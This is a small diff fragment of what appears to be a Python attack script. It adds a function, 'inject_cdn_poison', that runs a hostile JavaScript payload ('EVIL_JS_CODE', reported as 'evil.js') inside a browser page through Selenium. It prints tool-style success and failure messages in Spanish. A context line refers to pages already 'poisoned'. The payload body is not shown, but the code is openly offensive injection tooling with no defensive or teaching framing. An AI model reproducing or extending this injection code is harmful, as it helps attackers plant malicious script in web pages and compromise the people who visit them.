@@ -47,6 +47,14 @@ if (!window.__alreadyPoisoned) {
 }
 """
 
+def inject_cdn_poison(driver):
+    try:
+        driver.execute_script(EVIL_JS_CODE)
+        print("[+] evil.js inyectado inline con éxito.")
+    except Exception as e:
+        print(f"[❌] Fallo al inyectar código JS: {e}")
+
+
 
 
 
